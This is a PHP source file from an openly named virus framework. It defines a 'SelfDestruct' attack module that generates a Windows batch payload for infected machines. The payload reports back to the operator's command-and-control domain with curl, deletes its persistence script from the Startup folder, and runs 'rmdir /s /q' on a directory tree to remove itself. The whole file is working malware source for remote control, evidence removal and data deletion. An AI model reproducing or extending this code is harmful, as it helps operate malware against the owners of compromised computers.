<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class SelfDestruct. Self destructs simple viruses, not swarms. This basically delete the directory 3 levels up from this one and delete the startup script too.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class SelfDestruct extends AttackBase {
    private string $access_token; // this is supposed to increase security, but may not be so, like, now that I think about it, this is pretty unnecessary

    public function __construct() {
        parent::__construct();
        $this->access_token = hash("sha256", rand());
    }

    public function getAccessToken(): string {
        return $this->access_token;
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->access_token = $state["access_token"];
    }

    protected function getState(): string {
        $state = [];
        $state["access_token"] = $this->access_token;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "access_token=<?php echo $this->access_token; ?>" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function generateBatchCode(): string {
        ob_start();
        $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        $UFile = "$startup_directory\\U" . substr($this->virus_id, 0, 5) . ".vbs";
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo "del \"$UFile\"\n"; //@formatter:off ?>
        rmdir /s /q "%~pd0..\..\.."
        <?php return ob_get_clean(); //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
    }
}
